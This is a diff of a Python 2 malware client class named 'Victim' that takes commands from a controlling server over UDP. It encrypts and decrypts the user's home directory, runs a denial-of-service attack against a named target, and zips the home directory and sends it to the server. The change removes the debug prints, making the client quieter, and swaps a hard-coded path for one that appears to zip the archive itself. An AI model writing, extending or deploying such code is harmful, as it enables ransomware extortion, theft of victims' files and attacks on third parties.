@@ -23,25 +23,17 @@ class Victim(object):
 
     def send_message(self, msg):
         str_msg = str(msg)
-        print ("Sending %s to Server") % str_msg
         Messenger.send_message(self.ip, PORT, str_msg)
 
-    def receive_message(self, msg):
-        print "Got %s" % msg
-        return
-
     def process_decrypt_files(self, msg):
-        print "Decrypting files..."
         decrypt_home(msg[0])
         return
 
     def process_dos_attack(self, msg):
-        print "Target for dos attack %s" % str(msg[0])
         dos(msg[0], msg[1])
         return
 
     def process_encrypt_files(self, msg):
-        print "Encrypting files..."
         encrypt_home(msg[0])
         return
 
@@ -54,15 +46,11 @@ class Victim(object):
     def process_send_dir(self, msg):
         # This will send the infected computer's entire home dir
         # NEED to remove the hard coded directories and replace with home
-        print "Server has requested the home directory"
         home = expanduser("~")
-        print "home dir is %s" % str(home)
         zip_name = str(self.ip) + "home_dir.zip"
-        print "zip_name is %s" % str(zip_name)
         zipf = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
-        zipdir('/Users/MaherSamawi/test_zip', zipf)
+        zipdir(str(zip_name), zipf)
         zipf.close()
-        print "Sending it over"
         with open(zip_name, "r") as f:
             data = f.read()
             msg_contents = "D," + str(data)
@@ -75,7 +63,6 @@ class Victim(object):
         s = Messenger.set_up_listening_socket(VICTIM_LISTEN_PORT)
         while True:
             data, victim = s.recvfrom(8192)
-            print "Response from Server: %s" % (str(victim[0]))
             M_type = Messenger.get_msg_type(data)
             self.MSG_COMMANDS[M_type](self, Messenger.strip_msg(data))
         s.close()
